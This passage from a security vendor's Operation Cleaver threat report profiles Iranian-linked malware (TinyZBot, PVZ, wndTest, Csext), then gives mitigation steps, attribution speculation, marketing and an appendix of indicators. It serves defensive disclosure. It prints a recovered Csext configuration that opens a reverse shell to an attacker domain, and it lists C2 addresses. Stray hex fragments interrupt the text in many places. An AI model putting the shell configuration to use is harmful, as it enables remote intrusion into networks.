b204576696c
CLEAVER
e6
96
86
546
History ( cont . )
There also seem to be improved software engineering practices in many locations . FTP upload
support was added , with hardcoded credentials of ano:1 . This FTP upload functionality points
to the command and control server , and is invoked by a command in the SOAP command and
control channel . These versions have the capability to install as a service .
On August 25 , 2014 , the version compiled on August 18 was submitted to VirusTotal in a ZIP
archive located at http://dl.doosan - job(dot)com / cv / Easy_Resume_Creator-
v2.0.zip . This indicates that TinyZBot is not only being installed while impersonating a résumé
creation suite , but is also impersonating potential employers when distributed .
On September 9 , 2014 , a ZIP file containing TinyZBot and a configuration targeting a major US
university with its AppUsageId was created . This was discovered on an anonymous FTP server
in the same IP range as dl.doosan-job(dot)com along with other malware .
From September 11 through September 17 , 2014 , some TinyZBot components were compiled ,
along with a new dropper . This dropper impersonated a tool to submit a résumé to Teledyne .
When executed , the user is prompted to enter personal information , and at the end is given a
button to submit the résumé to Teledyne , although nothing is actually submitted . While the user
enters this information , their machine is infected with TinyZBot . The AppUsageIds for these
versions target a major US - based university as well as an Israeli aerospace company . These
versions began to include a new method of installing as a service . The service runs with the
name Network Connectivity Manager .
Interesting Notes
TinyZBot , as well as some other tools ( Csext , Net Crawler ) initially would not run without a
command line parameter set . This was likely to avoid detonation - based detection engines . This
command line parameter was opensesemi which is often stored in the application ’s code in
an obfuscated manner . The binders and droppers for TinyZBot provided this command line
argument and others when executing .
TinyZBot uses a dynamic mutex . This was accomplished by combining a static preset prefix with
the active process ID . This allowed supplemental tools to keep TinyZBot running by enumerating
every process and checking if the process ID and mutex prefix existed . If no mutex and process
pair was located , another TinyZBot instance would be started .
54
# OPCLEAVER
Command and Control Servers
•    88.150.214.168 , United Kingdom , microsoftactiveservices(dot)com
•    95.211.241.249 , Amsterdam , Noord - Holland , Netherlands
•    88.150.214.166 , United Kingdom
•    173.192.144.68 , Seattle , Washington , USA
•    188.227.180.213 , United Kingdom
•    192.111.145.197 , Rochester , New York , USA
Backdoors
Multiple backdoors were used by this organization . These are scripts or applications that allowed
for command or code execution outside of the victim network . Many of their backdoors were web
f20476 f64
applications , added to web servers , so commands can be executed from a browser or client able
6
4
to communicate with them . This group includes the results of the Shell Creator mentioned in the
4
20
Attribution section , as well as ASPX backdoors used by Nesha . A PHP shell was also observed ,
which also included attribution to Nesha in its hashed password .
c
c2
An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from
04576696
a staging server . This backdoor does not require authentication , and its use appears to be
straightforward . Its functionality breaks down into three fairly standard components : SQL queries ,
executing commands , and uploading files .
6b2
6e
9
86
546
Figure 24 : The ASPX backdoor named “ Zh0uSh3ll ” , allowing SQL queries .
55
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Figure 25 : The ASPX backdoor named “ Zh0uSh3ll ” , allowing file
This organization utilized backdoors which masqueraded as varying versions of Notepad . They
replace the existing Notepad.exe on the infected machine , and when run they call out to a
remote server and execute any shell code returned by the remote server . There will be a detailed
analysis of these backdoors posted to Cylance ’s blog in the future .
PVZ
PVZ is a name for a set of executables used together to create a botnet . The name PVZ was
assigned by us as this is one of the few tools this organization has not named themselves .
56
# OPCLEAVER
PVZ ( cont . )
The components are as follows :
•    PVZ - In
•    PVZ - Out
•    Syn Flooder
•    LoggerModule
•    XYNTService
•    Jasus
XYNTService was not developed by the Cleaver team , but instead is a publicly available project
which executes an executable as a service .
PVZ - In                         6f20476 f64
4 4
The purpose of PVZ - In 2
0
is to communicate with a command and control server . Communication
c
is primarily unidirectional , as little information is provided from the bot to its command and
c2
control server . The known command and control server is located at http://kundenpflege .
04576696
menrad(dot)de / js / jquery / default.aspx and the command and control protocol only uses
HTTP . The commands as well as infected computer information are transferred in the Content-
Disposition HTTP header , making the traffic easy to pass over as benign .
When a command is received from the server , the results are stored in a central location on disk
that the PVZ tools utilize . Command functionality is limited to executing supplied commands ,
downloading and executing executables as well as self - updating .
b2
The debug file path for PVZ - In is :
e6
6
C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\
9
Release\BotManager.pdb           6
8
546
PVZ - In has been observed using the file name ossisvc.exe .
PVZ - Out
PVZ - Out is the other half of the command and control channel , primarily uploading results of
commands and keystroke logging data to a remote server . The known command and control server
for PVZ - Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx .
Much like PVZ - In , this command and control channel communicates with the Content - Disposition
HTTP header , but for file data , POST data is supplied .
57
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Data uploaded is often compressed , which can make it more difficult to detect the exfiltration of
sensitive information .
The debug file path for PVZ - Out is :
C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\
Release\SendModule.pdb
PVZ - Out has been observed with the file name osppsvc.exe .
SYN Flooder
SYN Flooder is a simple network based denial of service tool . It is a command line utility capable of
being invoked by PVZ - In . Targeting information is supplied via command line parameters .
The debug file path for SYN Flooder is :
C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket - test\
Release\socket - test.pdb
SYN Flooder has been observed using the name ossysvc.exe .
Logger Module
Logger Module observes the user ’s actions and records them to a file . The recorded actions include
mouse clicks , active windows , keypresses , as well as clipboard data . The resulting log is written out
to a location where PVZ - Out can exfiltrate it to its command and control server . Logger Module has
been observed using the name ospcsvc.exe .
The following command and control servers for Logger Module have been observed :
212.87.154.14 , Baden - Wurttemberg , Germany , kundenpflege.menrad(dot)de
212.87.154.12 , Baden - Wurttemberg , Germany , www.gesunddurchsjahr(dot)de
wndTest
WndTest is the evolution of the PVZ tool chain into a single executable . The tool chain is minimized
down to a command and control communications , keystroke logging , and clipboard monitoring .
The command and control still supports upgrading , downloading , and executing of applications , as
well as executing batch scripts . WndTest installs as a service and has been observed attempting to
impersonate Adobe Report Service . WndTest starts using PHP servers for its command and control
server , some of which are listed as defaced sites .
58
# OPCLEAVER
We have seen wndTest communicate with the following servers :
•    209.208.97.44 , Orlando , Florida , USA , www.lat(dot)am
•    23.238.17.181 , Tulsa , Oklahoma , USA , regulatorfix(dot)com
•    209.208.97.44 , Orlando , Florida , USA , www.asiess(dot)com
•    198.50.100.210 , Quebec , Canada , halon(dot)com.br
•    207.182.142.68 , Columbus , Ohio , USA
•    95.211.191.247 , Amsterdam , Noord - Holland , Netherlands
Csext
Csext is a backdoor application developed in C # which runs as a service . Its primary functionality
is based on commands supplied by its configuration file . The configuration file is able to store
6f20476 f64
specific commands , which are intended to run at particular times . A recovered configuration is as
follows :
44
20
domain1=srv01.microsoftwindowsupdate(dot)net , check.html,3
% %
c
c2
{ 0}\{zhname}$$ -h -x -i { domain1 } -p 443 -e c:\windows\system32\cmd .
04576696
exe , taskkill.exe$$/F /PID { pid},00:29,00:35
% %
# #
This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net ( a
deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor
Relations ) with XORed communication using the HTTP protocol on TCP port 443 . This zhCat
2
instance is running cmd.exe , effectively making it a reverse connecting shell . This command
b
runs at 00:29 in the morning , and is killed by taskkill at 00:35 . This gives the attackers a
6
predictable method to regain access to a compromised network if they ever lose access .
6e
9
Csext also has email functionality similar to TinyZBot . This email functionality is used to exfiltrate
6
the results of commands from the command file which can also include requests like gathering
8
user information .             546
We have seen Csext configured to communicate with the following servers :
• 78.47.102.90 , Germany , srv01.microsoftwindowsupdate(dot)net
• 174.36.195.158 , Washington D.C , USA , srv01.microsoftupdateserver(dot )
net
59
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
MITIGATION COVER
MITIGATION
TTP COVER HERE
6f20476f6f64
44
20
c
c2
b204576696
6e6
9
86
546
# OPCLEAVER
60
# OPCLEAVER
MITIGATION
If after reviewing the Indicators of Compromise ( IOC ) listed in Appendix A , you believe your
organization to be a victim of Operation Cleaver , we recommend you consider the following course
of action :
1 . If inside the United States , contact the Federal Bureau of Investigation ( FBI ) via either your local
FBI team or FBI CYWATCH at 1 - 855 - 292 - 3937 or cywatch@ic.fbi.gov .
2 . If outside the United States , contact your local , district , state or federal law enforcement
authorities .
20476 f64
3 . If you have visibility into the attacks on your company and the tools and expertise to track them
6f
down , leverage the IOCs in Appendix A to identify their presence in your network , prevent them
4
4
from expanding the scope of the compromise , and remove their access immediately .
20 into the attacks , need help identifying an existing successful
4 . If you do NOT have visibility
c
c2
compromise in your organization , or more importantly wish to prevent this attack or attacks similar
to Operation Cleaver , please contact your security provider .
04576696
5 . If you wish to contact Cylance for additional details not available in this report , please email
opcleaver@cylance.com .
6 . If you would like to learn more about Cylance products and professional services , or discuss how
Cylance can mitigate Operation Cleaver ’s impact to your organization , please contact us directly .
6b2
+ 1 ( 877 ) 973 - 3336
6e
9
opcleaver@cylance.com     6
8
www.cylance.com       546
61
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
SPECULATION
SPECULATION COVER
TTP COVER HERE
6f20476f6f64
44
20
2c
6b204576696c
e
96
86
546
# OPCLEAVER
62
# OPCLEAVER
SPECULATION : THE WHY
Iran in 2014 can probably be best described as galvanizing . They have long been an “ enemy ” of
the west , and the United States in particular , but today ’s headlines include a variety of topics from
nuclear talks to human rights to terrorism to cyber hacking . Iran continues to be extremely active on
the global stage – and thereby on the radar of every superpower.10
Iran ’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard
dollars combined with national pride to help build their cyber army . Few doubt their commitment
as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage
their enemies . And it has been commonly postulated that almost all activity since 2010 coming out
of Iran is associated with retaliation for Stuxnet / Duqu / Flame , which seems natural given the severity
20476 f64
of the impact . But they do n’t need Stuxnet as motivation to want to hack the world . They have long
6 f
desired power on the political stage , in particular in the fight for nuclear power autonomy .
With the deadlines around0
44
the Iranian nuclear discussions pushed to 2015 , the attacks may be tied
2 discussing a pact with the nuclear superpowers of United States , Britain ,
to negotiating power when
c
c2
France , Germany , Russia and China .
04576696
The inner workings of the Iranian government remain largely a mystery to the western world .
However , Iran ’s control over its people and the private businesses birthed inside has been well
reported . In a 2014 Reuters article , the reporters detail how the secret Iranian organization called
“ Setad Ejraiye Farmane Hazrate Emam ” has become one of the most powerful organizations in the
country , capable of taking over properties and businesses , buying controlling interests in numerous
sectors including finance , oil , telecommunications and many others totaling in upwards of $ 95B.11
Even the US Treasury has documented an extensive fronting of companies in its report of Execution
b2
of Imam Khomeini ’s Order ( EIKO ) , which through its two main subsidiaries controls 37 private
6
businesses that are purely front companies for the Iranian government.12
6e
The history of Iran controlling the usage of the Internet and the very Internet on - ramps into Iran is
9
well known13 , 14 . They have controlled much of the country ’s Internet access to date and have taken
86
over controlling interests in those companies to carry out their work . Given Operation Cleaver ’s
546
frequent spin - up and take - down of large IP blocks inside the AFRANET IP space inside Iran ,
and Iran ’s well recorded investment in cyber warfare14 leads us to one simple conclusion : Iran is
extremely active in the world of hacking .
63
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Speculation : The Why ( cont . )
Involvement with North Korean
Operation Cleaver ’s intense focus on critical infrastructure companies , especially in South Korea ,
hints at information sharing or joint operations with Iran ’s partner , North Korea . In September ,
2012 , Iran signed an extensive agreement for technology cooperation agreement with North
Korea , which allows for collaboration on a variety of efforts including IT and security.6
Cyber Moving to Physical
Operation Cleaver ’s carefully selected targets like the oil and gas industry , energy and utility
companies , as well as airlines and airports , indicates Iran ’s desire to gain deep access into the
world ’s most critical environments . The end goal of this operation is not known at this time .
University Recruitment
University student recruitment was hinted at within Operation Cleaver and is consistent with
Iran ’s reported history of active warrior recruitment in the educational space.15
Overall , there are many reasons that Iran may be pursuing the targets they did in Operation
Cleaver . While we may never truly know , it is important to consider all the above and more when
trying to understand the why .
64
CONCLUSION
6f20476f6f64
44
20
c
c2
b204576696
6e6
9
86
546
# OPCLEAVER
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
CONCLUSION
After tracking the Operation Cleaver team for over two years , we ’re led to the inexorable
conclusion : the government of Iran , and particularly the Islamic Revolutionary Guard Corps
( IRGC ) , is backing numerous groups and front entities to attack the world ’s critical infrastructure .
As security experts in Critical Infrastructure and Key Resources ( CIKR ) , Industrial Control Systems
( ICS ) , Supervisory Control and Data Acquisition ( SCADA ) systems , Building Management Systems
( BMS ) , embedded systems and fixed - function systems , we know how easy they are to hack .
We have worked with countless customers and vendors throughout the years to notify them of
vulnerabilities , assist with remediatation efforts , and help mitigate threats to their environments .
Unfortunately , many critical infrastructure organizations are unable to secure their complex
envirnoments against modern attacks . They fall victim to the “ glue flu ” , a malaise of feeling stuck ,
not wanting to change the status quo for fear they will find problems that they have no idea how
to prevent . This “ security anaphylaxis ” spells real disaster .
If Operation Cleaver does n’t get the world to wake up to what is happening in the silent world of
cyber , then perhaps nothing will . Prevention is everything and we should never give up until it ’s
achieved .
Challenge your trusted advisors . Challenge your security vendors . Demand better technology
and services to detect , respond , but most importantly PREVENT not just contemporary attacks ,
but future exotic attacks that have yet to be imagined . That is what truly disruptive and innovative
technology is . Do n’t settle for anything less .
We hope that by exposing the Operation Cleaver team to the world , current global critical
infrastructure victims can be notified , and prevent future victimization from suffering the
consequences of “ status quo ” security . Unlike United Flight 811 , perhaps we can prevent the next
disaster .
DEFENDERS , NEVER GIVE UP !
66
# OPCLEAVER
REFERENCES
[ 1 ] Aboard Flight 811 : Passengers’ Routine Dissolves Into Terror - February 1989
http://www.nytimes.com/1989/02/26/us/aboard-flight-811-passengers-routine-dissolves-into-terror.html
[ 2 ] “ Forget China : Iran ’s Hackers Are American ’s Newest Cyber Threat ” - February 2014
http://complex.foreignpolicy.com/posts/2014/02/18/forget_china_iran_s_hackers_are_america_s_newest_cyber_
threat
[ 3 ] “ Developments in Iranian Cyber Warfare 2013 - 2014 ” - August 2014
http://www.inss.org.il/uploadImages/systemFiles/SiboniKronenfeld.pdf
[ 4 ] “ Iran ups cyber attacks on Israeli computers : Netanyahu ” - June 2013
http://uk.reuters.com/article/2013/06/09/us-israel-iran-cyber-idUKBRE95808H20130609
6   f20476 f64
[ 5 ] “ Iranians hacked Navy network for four months ? Not a surprise . ” - February 2014
44
http://arstechnica.com/information-technology/2014/02/iranians-hacked-navy-network-for-4-months-not-a-surprise/
[ 6 ] “ Iran and North Korea Sign 0
2 Technology Treaty to Combat Hostile Malware ” - September 2012
http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware #
c
c2
[ 7 ] “ Iran ’s Paramilitary Militia Is Recruiting Hackers ” - January 2011
04576696
http://www.forbes.com/sites/jeffreycarr/2011/01/12/irans-paramilitary-militia-is-recruiting-hackers/
[ 8 ] “ The Iranian Nuclear Weapon ” - January 2014
http://webcache.googleusercontent.com/search?q=cache:eJbMz7vynpQJ:iranredline.org/index .
php%3Fid%3D22+&cd=1&hl = en&ct = clnk&gl = us
[ 9 ] “ HPSR Threat Intelligence Briefing Episode 11 , February 2014 ” - February 2014
http://www8.hp.com/h20195/v2/getpdf.aspx/4AA5-1589ENW.pdf?ver=1.0
2
[ 10 ] “ Intel boss’ warning on cyber attacks no joke , say experts ” - November 2014
b
http://www.foxnews.com/world/2014/11/23/intel-boss-warning-on-cyber-attacks-no-joke-say-experts/
e6
[ 11 ] “ Khamenei controls massive financial empire built on property seizures ” - November 2013
96
http://www.reuters.com/investigates/iran/#article/part1
86
[ 12 ] “ Treasury Targets Assets of Iranian Leadership ” - June 2013
546
http://www.treasury.gov/press-center/press-releases/Pages/jl1968.aspx
[ 13 ] “ Internet Censorship in Iran ”
http://en.wikipedia.org/wiki/Internet_censorship_in_Iran
[ 14 ] “ Iranian Internet - Fact and Faction ”
http://surveillance.rsf.org/en/iran/
[ 15 ] “ Iran readying hacker attacks on U.S. infrastructure , specialists say ” - April 2012
http://www.washingtontimes.com/news/2012/apr/25/iran-readying-hacker-attacks-us-infrastructure-spe/?page=all
67
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
ABOUT CYLANCE
In the face of growing and evolving threats , traditional cyber protection technologies are now
widely considered inadequate . The only way to regain the upper hand against a new generation
of attackers , is to embrace something entirely new . Something that “ thinks ” like an attacker .
Something that does n’t rely on a trust model or care about hash lookups . Something with a brain .
“ The world has combated cyber threats by doing the same
thing over and over again ... it ’s the definition of insanity ! ”
Jeff Moss - Co - Chair of the DHS Community Resiliency Task Force
& Founder of BlackHat and DEFCON security conferences
Cylance has eschewed the old foundations that existing cybersecurity products are built upon .
Instead , we ’ve based our approach on mathematics , machine learning , and data science . This
algorithmic approach has been proven to detect – and stop – exponentially more modern threats .
Leveraging algorithmic risk modeling , CylancePROTECT protects endpoints from everyday viruses ,
worms , trojans , and spyware , but unlike other security products , CylancePROTECT offers true
future - proof protection against the most malicious threats in the world . Advanced Persistent Threats
( APT ) , 0-days , and exotic exploitation techniques are easily detected and halted with little - to - no
impact on the end - user .
Existing reactive solutions rely on a constant stream of signature updates for threat detection , which
is not only costly and inconvenient , but also requires “ sacrificial lambs ” . Only after a previously
unseen threat has inflicted damage can the rest of the industry begin to detect it . CylancePROTECT
does n’t require constant updates or even a network connection to protect against so - called
“ previously undetectable ” threats . By identifying and defusing attacks in near real time , before the
attack can execute , we can finally do away with the need for a “ patient zero ” .
As Richard Stiennon , Chief Research Analyst at IT - Harvest , put it , “ Many vendors are trying to solve
the endpoint problem , yet Cylance is the only one using the power of math to stop malware and
with more effectiveness and efficiency than current solutions ” .
Interested in seeing what CylancePROTECT can do for your organization ? Contact us !
Cylance is one of the fastest growing cybersecurity technology firms in the US . Cylance ’s flagship product
CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe . Cylance
was founded by 27-year security industry luminary , Stuart McClure , former Global CTO of McAfee , original founder
of Foundstone , and lead author of the international best - selling book Hacking Exposed . In building Cylance , Stuart
brought together the best scientific and executive minds from the likes of Cisco , Sourcefire , Google and McAfee . The
Cylance board of advisors includes former high - ranking officials from the DHS , the FBI , CIA , and executive titans of
business .
68
# OPCLEAVER
CYLANCE PRODUCTS
CylancePROTECT is the only next generation endpoint security product that applies math to
mute existing and future malware , viruses , worms , trojans , bots , APTs , 0-days , exploits , adware ,
spyware and hacking tools – without needing any updates or even a connection to the Internet .
The technology is founded on the principle that to fix the industry , you must start from scratch with
a way as yet unseen .
CylancePROTECT does not rely on signatures of any sort ( blacklist or whitelist ) , behavioral
analysis using IOCs , sandboxing analysis , heuristics , micro - virtualization , or dynamic detonation –
to detect and prevent malicious files from executing on a target endpoint .
While every other endpoint security product must collect a sample , analyze , and write a signature
f20476 f64
to detect it , CylancePROTECT can detect malware before it executes by statically analyzing
6
4
features found in the binary itself .
4
0
Features and Benefits of2CylancePROTECT :
c
c2
• Near real time detection of malicious files , even if they ’ve never been seen in the wild .
04576696
• Can be used to augment existing endpoint security or be deployed as a complete replacement .
• Does not require any signature updates or connection to the cloud .
• An easy - to - use web management console with intuitive workflows .
• Low - impact endpoint agent .
For a demo of CylancePROTECT , contact a Cylance expert today !
6b2
6e
9
86
546
Figure 26 : Cylance products detect and stop all the malware used in
Operation Cleaver , even though the vast majority of the samples are
completely missed by the antivirus industry as of this report ’s publication .
69
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
CYLANCE SERVICES
Cylance ’s Professional Services team is available to assist companies affected by this campaign .
Cylance is providing consulting to companies that may have been targeted by these advanced
threat actors . Cylance will perform initial triage in order to determine the extent to which your
company has been affected by this campaign and work towards establishing a containment
strategy .
Cylance has two tailored offerings for clients affected by this campaign . The first one includes
ICS in our incident response since many companies affected are in the Critical Infrastructure and
Key Resources ( CIKR ) vertical . The second offering ’s focus is to deploy our proprietary tools and
methodologies to detect and mitigate the threats posed by Operation Cleaver .
Option 1 : ICS Incident Response & APT Detection and Mitigation
Option 2 : Detection , Remediation , & Mitigation
For more information on how the Cylance Professional Services team can assess and respond to
attacks like the ones obseved in Operation Cleaver , contact sales@cylance.com today .
INCIDENT RESPONSE
COMPROMISE ASSESSMENTS                                                 Stop the threat , mitigate risk ,
and remediate .
Uncover previously undiscovered
breach and damage .
PENETRATION TESTING
Check the integrity of your
environment and infrastructure .                                           FORENSIC INVESTIGATIONS
Dig into who , what , where , and
CUSTOM SERVICES                                         when a compromise occurred .
Get expert help that addresses YOUR security needs .
70
# OPCLEAVER
ACKNOWLEDGMENTS
Brian Wallace
Brian is a Sr . Security Researcher for Cylance who joined shortly after the company was established .
He is best known for his avid botnet research ( often going by “ botnet_hunter ” ) and for his novel
malware analysis in the A Study in Bots blog series hosted by Cylance . Brian has been a dedicated
open - source developer as well as an advocate for public and private anti - botnet operations .
Brian actively develops techniques to combat cyber oppositions in positions where resources and
leverage are in too limited of supply for conventional means . These techniques , cultivated by Stuart
McClure , are the Art of Deterrence . In a previous investigation , Art of Deterrence techniques were
successfully used to divert Indonesian hackers motivated by monetary gain away from their highest
yielding target group .
6f20476 f64
4
Brian ’s botnet research covers a wide range of topics , from using graph analysis to estimate
4
20
the amount of ransom that has been paid to a ransomware operator , to utilizing IPv4 scanning
techniques to identify and take down point of sale malware panels .
c
c2
Stuart McClure
04576696
Stuart is founder , CEO / President and Chairman of Cylance . Widely recognized for his extensive and
in - depth knowledge of security products , Stuart McClure is considered one of the industry ’s leading
authorities in information security today . A well - published and acclaimed security visionary with
currently eleven books in print , McClure is the originating founder of the Hacking Exposed series
of books , the most successful security book ever written . From his work , he founded Foundstone in
October of 1999 which sold to McAfee in 2004 .
2
McClure brings over two decades of technology and executive leadership with profound technical ,
b
operational , and financial experience . Besides Foundstone , Stuart held leadership positions at
6
InfoWorld , Ernst & Young , Kaiser Permanente and a number of government agencies . At McAfee ,
6e
McClure held numerous positions including SVP / General Manager for the Security Management BU
9
as well as EVP / Global Chief Technology Officer responsible for almost $ 3B worth of revenues .
6
Today , McClure is CEO of Cylance , a disruptive and innovative startup applying math to the problem
8
546
of security . Cylance products such as CylancePROTECT prevent the most advanced attacks in the
world without signatures or sandboxing in realtime on the endpoint . Cylance Services offer highly
specialized security services such as incident response , forensics , compromise assessments and
advanced penetration assessments for global critical infrastructure .
Cylance Team
Cylance employees work passionately and tirelessly every day to achieve one goal : Protect the
world from cyber attacks . And with their efforts in tracking Operation Cleaver , they have achieved
that goal . Our endless thanks to all the Cylancers who contributed to this report .
71
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
THE OPERATION CLEAVER LOGO
The Operation Cleaver logo , created by Cylance specifically for this report , was inspired by the
infamous logo used by the Army of the Guardians of the Islamic Revolution , also known in the
west as the Iranian Revolutionary Guard Corps ( IRGC ) . Due to the close connection between the
members tracked in this report and the IRGC , it was only fitting to replicate the look and feel of the
IRGC ’s iconography as the anchor for this document ’s branding .
20476f6f64
446f
20
c
c2
04576696
e6b2
96
86
546
Army of the Guardians of the                                     Operation Cleaver
Islamic Republic ( IRGC )
Several of the visual elements present in the IRGC
The striking visual elements that make up the logo        logo have been carried over to the Operation Cleaver
of the IRGC have very specific meanings :                  logo including :
• 	    The clenched fist holding a rifle , most likely an    • 	    A clenched fist , this time holding a cleaver ,
AK-47 , represents armed resistance .                       represents the group ’s likely connection with the
• 	    The globe symbolizes the IRGC ’s worldwide                 IRGC as well as armed resistence in general .
ambitions .                                           • 	    The globe in the background represents
• 	    The book , from which the clenched first                   Operation Cleaver ’s worldwide reach .
emanates , represents the Qur’an , connecting          • 	    An ethernet cable connected to the clenched first
the religious ideals on which the group was               represents the nature of these attacks ( cyber as
founded to the armed struggle .                            opposed to traditional warfare ) .
• 	    The plants , possibly wheat , represent                • 	    The hex string translates to “ Think Evil , Do Good ” ,
prosperity .                                               a mantra our research team lives by .
• 	    The name of the group in Persian , the year in
which it was founded and a passage from the
Qur’an ( 8:60 ) ‘ And make ready against them all
you can of power’ , are represented in text .
72
APPENDIX A :
INDICATORS OF COMPROMISE
6f20476f6f64
44
20
c
c2
b204576696
6e6
9
86
546
# OPCLEAVER
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Indicators of Compromise ( IOC )
This Appendix details the IOCs discovered in the investigation of Operation Cleaver .
CylancePROTECT prevents the malware used in Operation Cleaver from ever executing .
Domains
doosan - job(dot)com
downloadsservers(dot)com
drivercenterupdate(dot)com
easyresumecreatorpro(dot)com
googleproductupdate(dot)com
googleproductupdate(dot)net
kundenpflege.menrad(dot)de
microsoftactiveservices(dot)com
microsoftmiddleast(dot)com
microsoftonlineupdates(dot)com
microsoftserverupdate(dot)com
microsoftupdateserver(dot)net
microsoftwindowsresources(dot)com
microsoftwindowsupdate(dot)net
northropgrumman(dot)net
teledyne - jobs(dot)com
windowscentralupdate(dot)com
windowssecurityupdate(dot)com
windowsserverupdate(dot)com
windowsupdateserver(dot)com
www.gesunddurchsjahr(dot)de
Email Addresses Used for Domain Registration
davejsmith200(at)outlook.com                      tarh.andishan(at)yahoo.com
salman.ghazikhani(at)outlook.com                  ahmadi(at)odeconline.com
btr.8624(at)yahoo.com                             kafe0(at)yahoo.com
ghanbarianco(at)gmail.com                         dg_co(at)yahoo.com
azlinux73(at)gmail.com                            zahiry_alireza(at)yahoo.com
domain(at)netafraz.com                            zahiry.alireza(at)gmail.com
74
# OPCLEAVER
Email Addresses Used for Exfiltration
testmail_00001(at)yahoo.com
TerafficAnalyzer(at)yahoo.com
dyanachear(at)beyondsys.com
IP Addresses
50.23.164.161                     95.211.191.225
64.120.128.154                    95.211.191.247
64.120.208.74                     95.211.241.249
64.120.208.75                     95.211.241.251
20476 f64
64.120.208.76                     108.175.152.230
64.120.208.78
46f
108.175.153.158
64.120.208.154                 4   159.253.144.209
66.96.252.198
78.109.194.114
20    173.192.144.68
174.36.195.158
c
c2
80.243.182.149                    184.82.158.18
87.98.167.71                      184.82.181.48
04576696
87.98.167.85                      188.227.180.213
87.98.167.141                     192.111.145.197
88.150.214.162                    203.150.224.249
88.150.214.166                    207.182.142.68
88.150.214.168                    212.87.154.12
88.150.214.170                    212.87.154.14
6b2
Mutexes
6e
9
ZSC1                            86
Adobe Report Service
Bmgr
546
Dynamic Mutexes
These mutexes are used with the process ID of the malware as a suffix :
demdaramdidam
ILoveThisMutex
75
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Installed Services Names
COM+ System Extentions
COM__System_Extentions
Network Connectivity Manager
Service1
MsNetMonitor
Pcapins
scManagerSvc
CredentialSync
Adobe Report Service
Samples ( MD5 )
Listed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver .
01606d42c64e4d15ea07d4e1fbd0c40d
0405adfc8739025ba88c746c8edebfb8
04fdf5b757764af8bc7ef88e0f8fe8c1
0512c5a8807e4fdeb662e61d81cd1645
0593352cadb2789c19c2660e02b2648b
08eabb6164b1b12307931e4f2d95f7c6
0900c3319e4c46ff9478e3e1fa9528a1
0acd8945bd162e5e7aa982cddbd8ecaa
0ad6a01a916f14fc24fa43e46813b3bb
0b2cbfa07fa9a090b35a3dfdb0ebad9d
0b80a8d2c56789b4bda9a56a53e7e2b1
0f4b526d8edf1d3d32c81a692c325733
10d019932fc43e9b39be709f8281203d
1223e93dd4a5ad0536c8232936cb35fe
144064951cceaf1bb81e8f215de76101
14a80287490f3a68d99c0f518b246fd2
17d1f25185b31044eb89a99d50d36a26
18942a44d2b5f2bbf54e2c18ac293915
18efd3f66d23c5c555e128a19de63667
19d9b37d3acf3468887a4d41bf70e9aa
1c2bc564805695dbb3a26d9c9f7dffea
1c7e40443e36c4b7592617f0a271835d
1d8fd8c357907a79f3e6d9f831f2bd7d
21829130d5e2a69b0f6963c68b070127
2e36a3f3b888c1fd3c3aa3f1ba7969ad
30120cf30ea4d870635893cd75338f97
304f7f17031af90012d4e4d1cc5cfb8a
336b501bd96e309f93c8d12960634248
38998ff6f9a3874b6943d7ac837d19c3
76
# OPCLEAVER
Samples ( MD5 ) cont .
3b6260ead85b4f0d706203e062a34a21
41eeae4158152f49ab64601c4358a7a1
42714874f86fa9bd97e9be460d7d72c0
42e459d1d057bd937e0d00958e591f08
48dd515e2b148493cf47b0c0c5713573
491f031d0a9ad4919cb29cb2d9a9a65c
4e483762f555b078976a1ddf3fc3e532
53230e7d5739091a6eb51298a50eb616
537b42d3cd9812e5b583131b83a48508
53841511791e4cac6f0768a9eb5def8a
54def27d598b75f297a8cf2c97150997
5837ad676f6c0f0f4f48096648d6e81b
6f20476 f64
5a4046fd0825641766b197a2132d2410
44
5e5d6469b270aa60dc90ddfde32ba082
5eef1ee37714c9ee07653419890010d6
20
6061410c04b9fa9e47593611a02ff2dd
6094f64d54575a2d5a3fbd2d23c4f44e
c
c2
61896424e995476b23f73a5c1c34af5e
04576696
61e307a651a7bbce78eb48c1d395501a
636c2d2855ac8a8693c4ef9e89c67205
641fc6831d8c215e9645cf5d4a8be5e5
68cfc418c72b58b770bdccf19805703e
69d80a27ab0c85ef073badbee7ec55c7
69f9705ecdcc709506f7665ad373c1a0
6cd5f1982693f2ce21effddf18f5baf5
2
6d4d21258eef96979ce6f2417c6c019f
b
6ef950941d114c09af359402620d7cba
6
735cdf3a3e9c06d88de31112782ef831
e
736aab6c731d098931d6a4bf11a8150e
96
758f2557922e360bff3d1565e6871ea1
6
765f3db4421bdf8bb953dffe37398453
8
546
78a63bc8433cea162e31a5865d5817c9
836ef6b06c5fd52ecc910a3e3408004a
84384d77ac9835720375943235d33a87
855239a2434a3bc78751d9ba9cfac900
8994e16b14cde144a9cebdff685d8676
9376e5b754ccd94f7c66b811d81e240e
948c570269059928517f155b4b6db1a4
94ef4f98b9c321f74778811f64c68d03
96e372dea573714d34e394550059b1d7
9838f7ead2023061eb79587243910daa
985e86ac1854585d2771fd173b63b98b
